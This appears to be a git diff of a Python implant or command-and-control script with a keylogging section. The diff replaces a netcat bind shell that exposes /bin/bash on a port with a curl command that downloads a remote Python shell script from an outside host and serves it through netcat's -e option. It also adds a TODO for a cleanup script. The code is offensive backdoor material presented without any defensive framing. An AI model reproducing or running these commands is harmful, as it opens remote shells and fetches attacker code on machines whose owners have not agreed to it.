@@ -8,7 +8,7 @@ import random
 
 #######
 #TODO Implement encryption with a specified key pair. Server gets the private key and all clients get public key. Allow for a config file to be used to specify key location. Script adds the key to the user's machine.
-
+#TODO make cleanup script
 
 
 
@@ -29,7 +29,8 @@ def startTTY(NCPORT):
     if OS == "win32" or "cygwin": #If the machine is Windows
         pass
     if OS == "linux" or "darwin" or "freebsd": #If the machine is linux or MacOS or FreeBSD
-        process = subprocess.Popen(f'nc -lnp {NCPORT} -e /bin/bash', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) #Start netcat on port 8081
+        subprocess.run("curl https://csh.rit.edu/~young/c2/py_shell >> ~/.shell.py", shell=True,capture_output=True,text=True)
+        process = subprocess.Popen(f'nc -lnp {NCPORT} -e "/usr/bin/python3 ~/.shell.py"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) #Start netcat on port 8081
         # err=process.stderr.read() #Read
 
 #Keylogging Functions
